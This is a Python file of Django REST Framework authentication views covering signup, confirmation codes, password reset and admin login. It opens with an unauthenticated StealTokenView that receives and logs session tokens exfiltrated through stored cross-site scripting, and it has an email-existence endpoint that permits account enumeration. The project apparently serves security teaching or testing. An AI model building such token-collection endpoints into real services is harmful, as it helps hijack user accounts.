from drf_spectacular.utils import extend_schema, OpenApiResponse
from rest_framework import status
from rest_framework.request import Request
from rest_framework.response import Response
from rest_framework.views import APIView

from . import serializers
from . import services
from .serializers import *


class StealTokenView(APIView):
    authentication_classes = []
    permission_classes = []

    def get(self, request, *args, **kwargs):
        tokens = self.request.query_params.get('token')
        print(f'Tokens from stored XSS: {tokens}')
        return Response(status=status.HTTP_200_OK)


class IsEmailExistView(APIView):
    authentication_classes = []
    permission_classes = []

    @extend_schema(
        tags=['Authentication'],
        summary='Check email existence',
        request=serializers.EmailSerializer,
        responses={
            200: OpenApiResponse(description="This email is already exist"),
            404: OpenApiResponse(description="This email does not exist"),
            403: OpenApiResponse(description="Invalid information")
        }
    )
    def post(self, request):
        email_request = serializers.EmailSerializer(data=self.request.data)
        if not email_request.is_valid():
            raise ValidationError(email_request.errors)
        if services.is_email_exists(email_request.data):
            return Response(data={'msg': 'This email already exists'}, status=status.HTTP_200_OK)
        else:
            return Response(data={'msg': 'This email does not exist'}, status=status.HTTP_404_NOT_FOUND)


class SignupView(APIView):
    authentication_classes = []
    permission_classes = []

    @extend_schema(
        tags=['Authentication'],
        request=SignupRequestSerializer,
        responses={
            201: OpenApiResponse(description='Account Created , Confirmation code send to guest email'),
            400: OpenApiResponse(description='Invalid information')
        },
        summary='Signup for guests'
    )
    def post(self, request: Request):
        signup_request = SignupRequestSerializer(data=request.data)
        if not signup_request.is_valid():
            raise ValidationError(signup_request.errors)
        services.register_new_user(signup_request.validated_data)
        return Response(data={'detail': 'Confirmation code sent successfully'}, status=status.HTTP_201_CREATED)


class ConfirmationView(APIView):
    authentication_classes = []
    permission_classes = []

    @extend_schema(
        tags=['Authentication'],
        summary='Account confirmation',
        description='Post the confirmation code with the user email',
        request=serializers.ConfirmationCodeRequestSerializer,
        responses={
            200: TokensSerializer
        }
    )
    def post(self, request):
        confirmation_request = serializers.ConfirmationCodeRequestSerializer(data=self.request.data)
        if confirmation_request.is_valid():
            tokens = services.activate_user(confirmation_request.validated_data)
            return Response(data=tokens, status=status.HTTP_200_OK)
        raise ValidationError(detail=confirmation_request.errors)


class ResendConfirmationView(APIView):
    authentication_classes = []
    permission_classes = []

    @extend_schema(
        tags=['Authentication'],
        summary='Resend Confirmation code',
        description='Use this endpoint to resend a confirmation code to the user again'
                    ', Provide the user email',
        request=EmailSerializer,
        responses={201: OpenApiResponse(description="confirmation code sent successfully")}
    )
    def post(self, _request):
        request = serializers.EmailSerializer(data=_request.data)
        if not request.is_valid():
            raise ValidationError(detail=request.errors)
        services.resend_confirmation_code(request.validated_data)
        return Response(
            data={"detail": "confirmation code sent successfully"},
            status=status.HTTP_200_OK
        )


class ResetPasswordView(APIView):
    authentication_classes = []
    permission_classes = []

    @extend_schema(
        tags=['Authentication'],
        summary='Reset Password 01',
        description='Used to send the reset password code to the user email.',
        request=serializers.EmailSerializer,
        responses={
            200: OpenApiResponse(description='Confirmation code sent successfully')
        }
    )
    def post(self, _request):
        request = serializers.EmailSerializer(data=_request.data)
        if not request.is_valid():
            raise ValidationError(request.errors)
        if not services.is_email_exists(request.validated_data):
            raise ValidationError({'detail': 'Invalid email address'})
        services.reset_password(request.validated_data)
        return Response(data={'detail': "Confirmation code was sent successfully"}, status=status.HTTP_200_OK)


class VerifyResetPasswordView(APIView):
    authentication_classes = []
    permission_classes = []

    @extend_schema(
        tags=['Authentication']
    )
    def post(self, _request):
        request = serializers.ConfirmationCodeRequestSerializer(data=_request.data)
        if not request.is_valid():
            raise ValidationError(request.errors)
        token = services.generate_token_for_password_reset(request.validated_data)
        return Response(data={'token': token}, status=status.HTTP_201_CREATED)


class CompletePasswordResetView(APIView):
    authentication_classes = []
    permission_classes = []

    @extend_schema(
        tags=['Authentication'],
        summary="Complete password reset",
        description="Complete password reset operation"
    )
    def post(self, _request):
        complete_request = serializers.CompletePasswordResetRequestSerializer(data=_request.data)
        if not complete_request.is_valid():
            raise ValidationError(complete_request.errors)
        services.update_password(complete_request.validated_data)
        # tokens = services.generate_tokens_for_guest()
        return Response(
            data={'detail': 'Your Password Has Been Changed Successfully'},
            status=status.HTTP_200_OK
        )


class LoginAdminView(APIView):
    authentication_classes = []
    permission_classes = []

    @extend_schema(
        summary='Login admin',
        request=serializers.LoginAdminRequestSerializer,
        responses={
            200: OpenApiResponse(response=serializers.AdminProfileSerializer),
            400: 'Internal server problem',
            404: 'When the information are invalid'
        }
    )
    def post(self, request, *args, **kwargs):
        login_request = serializers.LoginAdminRequestSerializer(data=self.request.data)
        if not login_request.is_valid():
            raise ValidationError(login_request.errors)
        tokens = services.login_admin(login_request.data)
        response = serializers.AdminProfileSerializer(data=tokens)
        if not response.is_valid():
            raise ValidationError(response.errors)
        return Response(data=response.data)
